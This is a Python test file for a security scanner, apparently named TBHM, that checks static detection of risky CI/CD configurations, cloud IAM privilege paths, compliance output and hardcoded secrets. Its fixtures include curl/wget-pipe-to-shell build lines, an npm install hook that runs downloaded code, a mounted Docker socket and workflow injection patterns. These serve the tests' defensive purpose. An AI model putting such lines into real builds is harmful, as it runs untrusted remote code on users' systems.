#!/usr/bin/env python3
"""Offline historical-coverage restoration tests for TBHM v3.9.7.2."""
from __future__ import annotations

import csv
import json
import sys
import tempfile
import types
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))


class CaptureStorage:
    def __init__(self):
        self.findings = []
        self.dropped = []

    def save_finding(self, finding):
        row = dict(finding)
        row.setdefault("id", len(self.findings) + 1)
        self.findings.append(row)
        return row["id"]

    def _record_drop(self, finding, reason, category):
        self.dropped.append({"finding": dict(finding), "reason": reason, "category": category})

    def all_findings(self):
        return list(self.findings)

    def is_phase_done(self, _name):
        return True


class NoToolRunner:
    def has(self, _name):
        return False

    def run(self, *_args, **_kwargs):
        return 127, "", "unavailable"


class HistoricalCoverageRestorationTests(unittest.TestCase):
    def test_cicd_restores_build_files_and_container_rules(self):
        from core.cicd_dataflow import analyze_tree
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / ".github/workflows").mkdir(parents=True)
            (root / ".circleci").mkdir()
            (root / ".github/workflows/build.yml").write_text(
                "jobs:\n  build:\n    container:\n      privileged: true\n"
                "    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n"
                "    steps:\n      - run: echo \"${{ github.event.release.name }}\"\n",
                encoding="utf-8",
            )
            (root / ".circleci/config.yml").write_text("version: 2.1\n", encoding="utf-8")
            (root / "release.workflow.yaml").write_text("jobs: {}\n", encoding="utf-8")
            (root / "Dockerfile").write_text("FROM alpine\nRUN curl https://invalid.test/install | bash\n", encoding="utf-8")
            (root / "Makefile").write_text("all:\n\techo ok\n", encoding="utf-8")
            (root / "package.json").write_text('{"scripts":{"install":"wget https://invalid.test/i | sh"}}', encoding="utf-8")
            (root / "pyproject.toml").write_text('[project]\nname="fixture"\n', encoding="utf-8")
            report = analyze_tree(root)
        paths = {row["path"] for row in report["files"]}
        self.assertTrue({
            ".github/workflows/build.yml", ".circleci/config.yml", "release.workflow.yaml",
            "Dockerfile", "Makefile", "package.json", "pyproject.toml",
        }.issubset(paths))
        titles = {row["title"] for row in report["findings"]}
        self.assertIn("CI job/container runs privileged", titles)
        self.assertIn("Build job mounts the Docker daemon socket", titles)
        self.assertIn("Build script executes remotely downloaded shell content", titles)
        self.assertIn("Untrusted event context may reach a workflow script", titles)
        self.assertEqual(report["boundary"], "Static analysis only. Workflow and build commands are never executed.")

    def test_cloud_iam_restores_roles_and_mixed_provider_records(self):
        from core.cloud_iam_graph import analyze
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "azure.json").write_text(json.dumps({
                "principalName": "alice", "roleDefinitionName": "Privileged Role Administrator", "scope": "tenant"
            }), encoding="utf-8")
            (root / "gcp.json").write_text(json.dumps({
                "bindings": [{"role": "roles/editor", "members": ["user:bob@example.com"]}]
            }), encoding="utf-8")
            (root / "mixed.json").write_text(json.dumps({
                "UserName": "carol", "Action": ["iam:CreateAccessKey"],
                "roleDefinitionName": "Application Administrator", "principalName": "svc-app"
            }), encoding="utf-8")
            report = analyze(root)
        paths = {(row["provider"], row["principal"], row["permission_or_role"]) for row in report["paths"]}
        self.assertIn(("azure", "alice", "privileged role administrator"), paths)
        self.assertIn(("gcp", "user:bob@example.com", "roles/editor"), paths)
        self.assertIn(("aws", "carol", "iam:createaccesskey"), paths)
        self.assertIn(("azure", "svc-app", "application administrator"), paths)
        self.assertTrue(all(row["exploitability"] == "not asserted" for row in report["paths"]))
        self.assertTrue(all(row["legacy_status"] == "POTENTIAL_PATH_REQUIRES_GRAPH_CONTEXT" for row in report["paths"]))


    def test_every_v396_cicd_rule_has_a_live_v3972_fixture(self):
        from core.cicd_dataflow import analyze_text
        fixture = """
on: pull_request_target
permissions: write-all
steps:
  - uses: actions/checkout@main
    with:
      persist-credentials: true
  - run: echo "${{ github.event.release.name }}"
container:
  privileged: true
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
build-a: curl https://invalid.test/a | bash
build-b: wget https://invalid.test/b | sh
"""
        rows = analyze_text(fixture, path=".github/workflows/legacy.yml")
        titles = {row["title"] for row in rows}
        expected = {
            "pull_request_target trust boundary requires review",
            "Third-party action uses a mutable reference",
            "Workflow grants write-all permissions",
            "Checkout persists repository credentials",
            "Untrusted event context may reach a workflow script",
            "CI job/container runs privileged",
            "Build job mounts the Docker daemon socket",
            "Build script executes remotely downloaded shell content",
        }
        self.assertTrue(expected.issubset(titles), sorted(expected - titles))

    def test_every_v396_cloud_indicator_remains_detectable(self):
        from core.cloud_iam_graph import SENSITIVE, analyze
        old_expected = {
            "aws": {
                "iam:passrole", "iam:createaccesskey", "iam:attachuserpolicy",
                "iam:putuserpolicy", "iam:putrolepolicy", "sts:assumerole",
                "lambda:createfunction", "ec2:runinstances",
            },
            "azure": {
                "microsoft.authorization/roleassignments/write", "owner",
                "user access administrator", "application administrator",
                "privileged role administrator",
            },
            "gcp": {
                "resourcemanager.projects.setiampolicy", "iam.serviceaccounts.actas",
                "iam.serviceaccounttokencreator", "roles/owner", "roles/editor",
            },
        }
        for provider, values in old_expected.items():
            self.assertTrue(values.issubset(set(SENSITIVE[provider])))
        with tempfile.TemporaryDirectory() as td:
            source = Path(td) / "mixed-all.json"
            source.write_text(json.dumps({
                "UserName": "fixture-principal",
                "Action": sorted(old_expected["aws"]),
                "azureRoles": sorted(old_expected["azure"]),
                "gcpRoles": sorted(old_expected["gcp"]),
            }), encoding="utf-8")
            report = analyze(source)
        observed = {(row["provider"], row["permission_or_role"]) for row in report["paths"]}
        for provider, values in old_expected.items():
            self.assertTrue({(provider, value) for value in values}.issubset(observed), provider)

    def test_compliance_aliases_preserve_old_consumers_without_fake_pass(self):
        from core.compliance_predicates import evaluate_control
        control = {"id": "CTRL-1", "title": "Authorization", "tags": ["access-control"], "phases": ["access_control"]}
        finding = {"id": 17, "phase": "access_control", "title": "Broken authorization", "status": "lead"}
        failed = evaluate_control(control, [finding], lambda _name: True, framework="fixture")
        self.assertEqual(failed["control_identifier"], "CTRL-1")
        self.assertEqual(failed["id"], "CTRL-1")
        self.assertEqual(failed["evidence_references"], [17])
        self.assertEqual(failed["finding_refs"], [17])
        self.assertEqual(failed["status"], "fail")
        self.assertEqual(failed["legacy_status"], "findings")
        unknown = evaluate_control(control, [], lambda _name: True, framework="fixture")
        self.assertEqual(unknown["status"], "unknown")
        self.assertEqual(unknown["legacy_status"], "tested-unknown")
        self.assertNotEqual(unknown["legacy_status"], "tested-clean")

    def test_compliance_csv_contains_new_and_historical_columns(self):
        from phases import compliance_reporting_extended
        with tempfile.TemporaryDirectory() as td:
            output = Path(td)
            ctx = types.SimpleNamespace(
                output=output,
                args=types.SimpleNamespace(compliance_catalog=None, compliance_frameworks=""),
                storage=CaptureStorage(),
                profile={"name": "fixture"},
                phase_state={},
                log=lambda *_args, **_kwargs: None,
            )
            compliance_reporting_extended.run(ctx)
            csv_path = output / "redteam/104_compliance_reporting_extended/compliance_framework_matrix.csv"
            with csv_path.open(newline="", encoding="utf-8") as handle:
                header = next(csv.reader(handle))
            for field in ("id", "finding_refs", "legacy_status", "control_identifier", "evidence_references", "status"):
                self.assertIn(field, header)
            self.assertTrue((output / "redteam/104_compliance_reporting_extended/compliance_summary.json").is_file())
            self.assertTrue((output / "redteam/104_compliance_reporting_extended/compliance_legacy_summary.json").is_file())

    def test_ocsf_preserves_legacy_uid_and_new_stable_fingerprint(self):
        from core.ocsf import finding_event, _fingerprint
        finding = {"phase": "code_intel", "title": "Static lead", "target": "src/app.py", "url": "", "cwe": "CWE-78", "severity": "HIGH"}
        row = finding_event(finding, tool_version="3.9.7.2")
        self.assertEqual(row["finding_info"]["uid"], _fingerprint(finding))
        self.assertEqual(row["unmapped"]["legacy_uid"], _fingerprint(finding))
        self.assertNotEqual(row["unmapped"]["stable_fingerprint"], "")
        explicit = finding_event({**finding, "id": 42}, tool_version="3.9.7.2")
        self.assertEqual(explicit["finding_info"]["uid"], "42")

    def test_data_document_scanning_is_default_off_and_safe_opt_in(self):
        from tbhm import Ctx
        from phases import code_scan
        secret = "Q7mX2pL9vR4sT8kN6cB3"
        with tempfile.TemporaryDirectory() as td:
            root = Path(td) / "src"
            root.mkdir()
            (root / "operations.json").write_text(json.dumps({"api_key": secret, "endpoint": "/api/internal"}), encoding="utf-8")
            (root / "notes.md").write_text("Review sample: eval(user_input)\n", encoding="utf-8")
            (root / "placeholder.txt").write_text('password="changeme"\n', encoding="utf-8")

            def make_ctx(name, enabled):
                out = Path(td) / name
                out.mkdir()
                args = types.SimpleNamespace(
                    code_dir=str(root), code_repos=None, code_repos_file=None,
                    code_scan_data_files=enabled, code_scan_extra_extensions=None,
                    secret_min_entropy=3.0, secret_confidence="medium",
                    include_ineligible=True, no_fp_filter=False, validate_secrets=False,
                    silent=True,
                )
                store = CaptureStorage()
                ctx = Ctx(args, {"name": "fixture"}, store, NoToolRunner(), None, None, out)
                return ctx, store

            default_ctx, default_store = make_ctx("default", False)
            code_scan.run(default_ctx)
            self.assertEqual(default_store.findings, [])
            self.assertIn("/api/internal", (default_ctx.output / "code/endpoints.txt").read_text())

            opt_ctx, opt_store = make_ctx("opt", True)
            code_scan.run(opt_ctx)
            self.assertGreaterEqual(len(opt_store.findings), 2)
            secret_rows = [row for row in opt_store.findings if "Hardcoded secret" in row.get("title", "")]
            sink_rows = [row for row in opt_store.findings if "Dangerous code pattern" in row.get("title", "")]
            self.assertTrue(secret_rows)
            self.assertTrue(sink_rows)
            self.assertTrue(all(row.get("data_file_opt_in") is True for row in secret_rows + sink_rows))
            self.assertTrue(all(row.get("status") == "lead" for row in secret_rows + sink_rows))
            self.assertNotIn(secret, json.dumps(opt_store.findings))
            self.assertFalse(any("changeme" in json.dumps(row) for row in opt_store.findings))

    def test_historical_scan_catalog_union_and_cli_switches(self):
        import core.code_patterns as patterns
        import phases.nuclei_extended as nuclei
        import tbhm
        expected_data = {".json", ".xml", ".html", ".txt", ".md"}
        self.assertEqual(set(patterns.HISTORICAL_DATA_EXT), expected_data)
        self.assertTrue(expected_data.isdisjoint(patterns.SCAN_EXT))
        self.assertEqual(len(patterns._SECRET_DEFS), 23)
        self.assertEqual(len(patterns._SINK_DEFS), 27)
        exposures = next(args for name, args, _floor, _score in nuclei.SWEEPS if name == "exposures")
        self.assertIn("exposure,config,files,backup,dotfile", exposures)
        argv = sys.argv
        try:
            sys.argv = ["tbhm", "--capability-status", "--code-scan-data-files", "--code-scan-extra-extensions", "conf,tmpl"]
            args = tbhm.parse_args()
        finally:
            sys.argv = argv
        self.assertTrue(args.code_scan_data_files)
        self.assertEqual(args.code_scan_extra_extensions, "conf,tmpl")
        self.assertEqual(args.code_security_tools, "bandit,njsscan,gitleaks,trivy,grype,checkov,terrascan,tfsec")


if __name__ == "__main__":
    unittest.main(verbosity=2)
